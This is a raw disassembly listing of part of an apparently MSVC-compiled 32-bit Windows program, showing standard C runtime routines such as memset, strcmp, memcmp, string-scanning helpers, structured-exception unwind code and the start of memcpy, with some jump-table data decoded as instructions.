  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
  428378:	mov    ecx,DWORD PTR [ebp+0x10]
  42837b:	mov    edi,DWORD PTR [ebp+0x8]
  42837e:	mov    eax,ecx
  428380:	mov    edx,ecx
  428382:	add    eax,esi
  428384:	cmp    edi,esi
  428386:	jbe    0x428390
  428388:	cmp    edi,eax
  42838a:	jb     0x42850c
  428390:	test   edi,0x3
  428396:	jne    0x4283ac
  428398:	shr    ecx,0x2
  42839b:	and    edx,0x3
  42839e:	cmp    ecx,0x8
  4283a1:	jb     0x4283cc
  4283a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	jmp    DWORD PTR [edx*4+0x4284bc]
  4283ac:	mov    eax,edi
  4283ae:	mov    edx,0x3
  4283b3:	sub    ecx,0x4
  4283b6:	jb     0x4283c4
  4283b8:	and    eax,0x3
  4283bb:	add    ecx,eax
  4283bd:	jmp    DWORD PTR [eax*4+0x4283d0]
  4283c4:	jmp    DWORD PTR [ecx*4+0x4284cc]
  4283cb:	nop
  4283cc:	jmp    DWORD PTR [ecx*4+0x428450]
  4283d3:	nop
  4283d4:	loopne 0x428359
  4283d6:	inc    edx
  4283d7:	add    BYTE PTR [esp+eax*4],cl
  4283da:	inc    edx
  4283db:	add    BYTE PTR [eax],dh
  4283dd:	test   BYTE PTR [edx+0x0],al
  4283e0:	and    edx,ecx
  4283e2:	mov    al,BYTE PTR [esi]
  4283e4:	mov    BYTE PTR [edi],al
  4283e6:	mov    al,BYTE PTR [esi+0x1]
  4283e9:	mov    BYTE PTR [edi+0x1],al
  4283ec:	mov    al,BYTE PTR [esi+0x2]
  4283ef:	shr    ecx,0x2
  4283f2:	mov    BYTE PTR [edi+0x2],al
  4283f5:	add    esi,0x3
  4283f8:	add    edi,0x3
  4283fb:	cmp    ecx,0x8
  4283fe:	jb     0x4283cc
  428400:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428402:	jmp    DWORD PTR [edx*4+0x4284bc]
  428409:	lea    ecx,[ecx+0x0]
  42840c:	and    edx,ecx
  42840e:	mov    al,BYTE PTR [esi]
  428410:	mov    BYTE PTR [edi],al
  428412:	mov    al,BYTE PTR [esi+0x1]
  428415:	shr    ecx,0x2
  428418:	mov    BYTE PTR [edi+0x1],al
  42841b:	add    esi,0x2
  42841e:	add    edi,0x2
  428421:	cmp    ecx,0x8
  428424:	jb     0x4283cc
  428426:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428428:	jmp    DWORD PTR [edx*4+0x4284bc]
  42842f:	nop
  428430:	and    edx,ecx
  428432:	mov    al,BYTE PTR [esi]
  428434:	mov    BYTE PTR [edi],al
  428436:	add    esi,0x1
  428439:	shr    ecx,0x2
  42843c:	add    edi,0x1
  42843f:	cmp    ecx,0x8
  428442:	jb     0x4283cc
  428444:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428446:	jmp    DWORD PTR [edx*4+0x4284bc]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    bl,0x84
  428452:	inc    edx
  428453:	add    BYTE PTR [eax-0x67ffbd7c],ah
  428459:	test   BYTE PTR [edx+0x0],al
  42845c:	nop
  42845d:	test   BYTE PTR [edx+0x0],al
  428460:	mov    BYTE PTR [edx+eax*2+0x42848000],al
  428467:	add    BYTE PTR [eax-0x7c],bh
  42846a:	inc    edx
  42846b:	add    BYTE PTR [eax-0x7c],dh
  42846e:	inc    edx
  42846f:	add    BYTE PTR [ebx-0x761b71bc],cl
  428475:	inc    esp
  428476:	(bad)  
  428477:	in     al,0x8b
  428479:	inc    esp
  42847a:	mov    gs,eax
  42847c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428480:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428484:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428488:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42848c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  428490:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  428494:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  428498:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42849c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4284a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4284a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4284a8:	lea    eax,[ecx*4+0x0]
  4284af:	add    esi,eax
  4284b1:	add    edi,eax
